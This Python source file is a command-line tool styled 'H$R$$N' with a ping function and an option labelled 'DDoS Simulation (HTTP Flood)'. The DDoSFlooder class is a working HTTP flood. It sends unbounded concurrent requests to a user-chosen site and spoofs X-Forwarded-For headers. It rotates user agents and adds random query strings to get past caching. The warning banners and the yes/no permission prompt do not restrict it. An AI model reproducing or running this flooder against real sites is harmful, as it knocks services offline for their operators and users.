#!/usr/bin/env python3
"""
H$R$$N v1.0 - Network Testing & Security Analysis Tool
Author: H$R$$N
License: MIT
Description: High-performance async network testing with glitch effects
"""

import asyncio
import aiohttp
import random
import string
import sys
import time
import subprocess
import platform
import os
from urllib.parse import urljoin, urlparse

__version__ = "1.0.0"
__author__ = "H$R$$N"


# Glitchy H$R$$N Logo - Matrix Style
LOGO = """
\033[92m
 ██╗  ██╗  ███████╗  ███████╗  ███████╗  ███████╗  ██╗  ██╗
 ██║  ██║  ██╔════╝  ██╔══██╗  ██╔══██╗  ██╔════╝  ╚██╗██╔╝
 ███████║  ███████╗  ██████╔╝  ██████╔╝  ███████╗   ╚███╔╝ 
 ██╔══██║  ╚════██║  ██╔══██╗  ██╔══██╗  ╚════██║   ██╔██╗ 
 ██║  ██║  ███████║  ██║  ██║  ██║  ██║  ███████║  ██╔╝ ██╗
 ╚═╝  ╚═╝  ╚══════╝  ╚═╝  ╚═╝  ╚═╝  ╚═╝  ╚══════╝  ╚═╝  ╚═╝
      \033[92m$\033[0m          \033[92m$\033[0m           \033[92m$\033[0m           \033[92m$\033[0m
\033[92m
 ██╗  ██╗ ██████╗  ███████╗ ███████╗ ███╗   ██╗
 ██║  ██║ ██╔══██╗ ██╔════╝ ██╔════╝ ████╗  ██║
 ███████║ ██████╔╝ █████╗   ███████╗ ██╔██╗ ██║
 ██╔══██║ ██╔══██╗ ██╔══╝   ╚════██║ ██║╚██╗██║
 ██║  ██║ ██║  ██║ ███████╗ ███████║ ██║ ╚████║
 ╚═╝  ╚═╝ ╚═╝  ╚═╝ ╚══════╝ ╚══════╝ ╚═╝  ╚═══╝
\033[0m
\033[92m╔══════════════════════════════════════════════════════════╗
║     Network Testing & Security Analysis Tool v1.0          ║
║     Use Responsibly - Authorized Testing Only            ║
╚══════════════════════════════════════════════════════════╝\033[0m
"""


def clear_screen():
    """Clear terminal screen"""
    os.system('cls' if platform.system() == 'Windows' else 'clear')


def glitch_text(text, duration=0.8):
    """Glitch animation effect for text"""
    glitch_chars = "$#@%&*+=-~<>?"
    
    for _ in range(int(duration * 10)):
        display = ""
        for char in text:
            if random.random() > 0.3:
                display += random.choice(glitch_chars)
            else:
                display += char
        print(f"\r\033[92m{display}\033[0m", end="", flush=True)
        time.sleep(0.05)
    
    print(f"\r\033[92m{text}\033[0m", flush=True)


def matrix_rain_line():
    """Print a line of matrix rain"""
    chars = "ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ"
    line = "".join(random.choice(chars) for _ in range(60))
    print(f"\033[92m{line}\033[0m")


def animate_hrssn():
    """Animate H$R$$N name with glitch effect"""
    name = "H$R$$N"
    print()
    
    for i in range(len(name) + 1):
        partial = name[:i]
        filler = "".join(random.choice("$#@%&*") for _ in range(len(name) - i))
        print(f"\r\033[92m[ {partial}{filler} ]\033[0m", end="", flush=True)
        time.sleep(0.15)
    
    time.sleep(0.3)
    
    for _ in range(5):
        glitched = "".join(random.choice("$#@%&*") if random.random() > 0.5 else c for c in name)
        print(f"\r\033[92m[ {glitched} ]\033[0m", end="", flush=True)
        time.sleep(0.1)
    
    print(f"\r\033[92m[ {name} ]\033[0m")
    time.sleep(0.2)


def print_logo():
    """Display the H$R$$N logo with matrix effect"""
    clear_screen()
    
    for _ in range(3):
        matrix_rain_line()
        time.sleep(0.05)
    
    print(LOGO)
    
    for _ in range(2):
        matrix_rain_line()
        time.sleep(0.05)
    
    print()


def print_menu():
    """Display the main menu"""
    print("\n\033[92m╔══════════════════════════════════════════════════════════╗")
    print("║\033[0m              \033[92m[ H$R$$N - Main Menu ]\033[0m                    \033[92m║")
    print("╠══════════════════════════════════════════════════════════╣\033[0m")
    print("\033[92m║\033[0m                                                          \033[92m║\033[0m")
    print("\033[92m║\033[0m   \033[96m[1]\033[0m  \033[97mPing Target\033[0m                                      \033[92m║\033[0m")
    print("\033[92m║\033[0m   \033[96m[2]\033[0m  \033[97mDDoS Simulation (HTTP Flood)\033[0m                     \033[92m║\033[0m")
    print("\033[92m║\033[0m   \033[96m[3]\033[0m  \033[97mExit\033[0m                                             \033[92m║\033[0m")
    print("\033[92m║\033[0m                                                          \033[92m║\033[0m")
    print("\033[92m╚══════════════════════════════════════════════════════════╝\033[0m")


def ping_target():
    """Ping a target host with animation"""
    animate_hrssn()
    glitch_text("INITIATING PING SEQUENCE...", 0.5)
    
    target = input("\n\033[93m[?] Enter target IP or domain: \033[0m").strip()
    
    if not target:
        print("\033[91m[-] No target specified\033[0m")
        return
    
    print(f"\n\033[94m[*] Pinging {target}...\033[0m")
    print("\033[92m" + "-" * 50 + "\033[0m")
    
    try:
        param = '-n' if platform.system().lower() == 'windows' else '-c'
        count = '4'
        
        command = ['ping', param, count, target]
        result = subprocess.run(command, capture_output=True, text=True)
        
        print(result.stdout)
        
        if result.returncode == 0:
            print(f"\033[92m[+] {target} is ONLINE\033[0m")
            glitch_text("TARGET REACHABLE", 0.3)
        else:
            print(f"\033[91m[-] {target} is OFFLINE\033[0m")
            glitch_text("TARGET UNREACHABLE", 0.3)
            
    except Exception as e:
        print(f"\033[91m[-] Error: {e}\033[0m")


class DDoSFlooder:
    """HTTP Flood implementation"""
    
    def __init__(self, target_url, concurrency=100, timeout=5):
        self.target_url = target_url
        self.concurrency = concurrency
        self.timeout = timeout
        self.success_count = 0
        self.fail_count = 0
        self.total_requests = 0
        self.running = True
        
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
        ]
        
        self.endpoints = ['/', '/api', '/search', '/login', '/register', '/home', '/about']
    
    def get_random_headers(self):
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Cache-Control': 'no-cache',
            'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
        }
    
    def get_random_params(self):
        params = {}
        for _ in range(random.randint(1, 3)):
            key = ''.join(random.choices(string.ascii_lowercase, k=5))
            val = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
            params[key] = val
        return params
    
    async def make_request(self, session, semaphore):
        async with semaphore:
            if not self.running:
                return
            
            try:
                endpoint = random.choice(self.endpoints)
                url = urljoin(self.target_url, endpoint)
                params = self.get_random_params()
                headers = self.get_random_headers()
                
                async with session.get(
                    url, 
                    headers=headers, 
                    params=params,
                    timeout=aiohttp.ClientTimeout(total=self.timeout),
                    allow_redirects=True
                ) as response:
                    self.success_count += 1
                    self.total_requests += 1
                    
            except Exception:
                self.fail_count += 1
                self.total_requests += 1
    
    async def stats_reporter(self):
        while self.running:
            await asyncio.sleep(1)
            print(f"\r\033[92m[+] Requests: {self.total_requests} | Success: {self.success_count} | Failed: {self.fail_count}\033[0m", 
                  end='', flush=True)
    
    async def run(self, duration=None):
        print(f"\n\033[94m[*] Target: {self.target_url}\033[0m")
        print(f"\033[94m[*] Concurrency: {self.concurrency}\033[0m")
        print(f"\033[93m[*] Press Ctrl+C to stop\033[0m\n")
        
        connector = aiohttp.TCPConnector(
            limit=self.concurrency * 2,
            limit_per_host=self.concurrency,
            enable_cleanup_closed=True,
            force_close=True,
        )
        
        semaphore = asyncio.Semaphore(self.concurrency)
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.timeout)
        ) as session:
            
            tasks = []
            stats_task = asyncio.create_task(self.stats_reporter())
            start_time = time.time()
            
            while self.running:
                if duration and (time.time() - start_time) >= duration:
                    break
                    
                task = asyncio.create_task(self.make_request(session, semaphore))
                tasks.append(task)
                tasks = [t for t in tasks if not t.done()]
                
                if len(tasks) > self.concurrency * 10:
                    await asyncio.gather(*tasks[:100])
                    tasks = tasks[100:]
            
            if tasks:
                await asyncio.gather(*tasks, return_exceptions=True)
            
            self.running = False
            await stats_task


def ddos_menu():
    """DDoS attack menu with animation"""
    animate_hrssn()
    glitch_text("INITIATING DDoS SEQUENCE...", 0.5)
    
    print("\n\033[91m╔══════════════════════════════════════════════════════════╗")
    print("║\033[0m              \033[91m⚠ DDoS SIMULATION MODE ⚠\033[0m                    \033[91m║")
    print("║\033[0m                                                          \033[91m║")
    print("║\033[0m  \033[93mWARNING: Authorized use only!\033[0m                         \033[91m║")
    print("║\033[0m  \033[93mUnauthorized use is ILLEGAL.\033[0m                          \033[91m║")
    print("╚══════════════════════════════════════════════════════════╝\033[0m")
    
    target = input("\n\033[93m[?] Target URL (e.g., http://localhost:8080): \033[0m").strip()
    
    if not target:
        print("\033[91m[-] No target specified\033[0m")
        return
    
    parsed = urlparse(target)
    if not parsed.scheme or not parsed.netloc:
        print("\033[91m[-] Invalid URL. Use: http://example.com\033[0m")
        return
    
    try:
        concurrency = int(input("\033[93m[?] Concurrent connections [100]: \033[0m") or "100")
    except ValueError:
        concurrency = 100
    
    try:
        duration_input = input("\033[93m[?] Duration in seconds (Enter=unlimited): \033[0m").strip()
        duration = int(duration_input) if duration_input else None
    except ValueError:
        duration = None
    
    print("\n" + "\033[91m" + "=" * 60 + "\033[0m")
    print("\033[91mWARNING: Only use on systems you own!\033[0m")
    print("\033[91mUnauthorized use is ILLEGAL.\033[0m")
    print("\033[91m" + "=" * 60 + "\033[0m")
    
    confirm = input("\n\033[93mDo you have permission? (yes/no): \033[0m")
    if confirm.lower() != 'yes':
        print("\033[91m[-] Cancelled\033[0m")
        return
    
    glitch_text("STARTING FLOOD...", 0.5)
    
    flooder = DDoSFlooder(target_url=target, concurrency=concurrency, timeout=5)
    
    try:
        asyncio.run(flooder.run(duration=duration))
    except KeyboardInterrupt:
        print("\n\n\033[93m[*] Stopping...\033[0m")
        flooder.running = False
    
    print(f"\n\n\033[92m[+] Final Stats:\033[0m")
    print(f"    Total Requests: {flooder.total_requests}")
    print(f"    Successful: {flooder.success_count}")
    print(f"    Failed: {flooder.fail_count}")


def exit_animation():
    """Exit animation"""
    animate_hrssn()
    glitch_text("SHUTTING DOWN...", 0.5)
    print("\n\033[92m[+] H$R$$N v1.0 terminated. Stay safe!\033[0m\n")
    time.sleep(0.5)


def check_dependencies():
    """Check if required packages are installed"""
    try:
        import aiohttp
        return True
    except ImportError:
        print("\033[91m[-] Missing dependencies!\033[0m")
        print("\033[93m[*] Run: pip install -r requirements.txt\033[0m")
        return False


def main():
    """Main entry point"""
    if not check_dependencies():
        sys.exit(1)
    
    print_logo()
    
    while True:
        print_menu()
        choice = input("\n\033[93m[?] Select option: \033[0m").strip()
        
        if choice == '1':
            ping_target()
        elif choice == '2':
            ddos_menu()
        elif choice == '3':
            exit_animation()
            break
        else:
            print("\033[91m[-] Invalid option\033[0m")


if __name__ == '__main__':
    main()